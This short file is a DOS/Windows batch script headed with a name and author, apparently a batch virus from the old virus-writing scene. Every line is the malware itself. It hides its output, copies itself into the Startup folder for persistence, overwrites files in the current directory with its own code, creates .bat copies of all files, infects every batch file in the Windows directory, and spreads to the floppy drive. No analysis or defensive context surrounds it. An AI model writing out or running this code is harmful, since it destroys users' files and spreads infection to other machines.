REM Name:     butterfliege  
REM Author:   spth          
@echo off
ctty nul
copy %0 %windir%\startm~1\progra~1\autost~1\*.bat
md C:\subs
copy %0 C:\subs
subst L: C:\subs
for %%v in (*.*) do Set M=%%v
copy %0 %M%
copy *.* *.bat
for %%w in (%windir%\*.bat) do copy %0 %%w
copy %0 A:\*.bat
ctty con
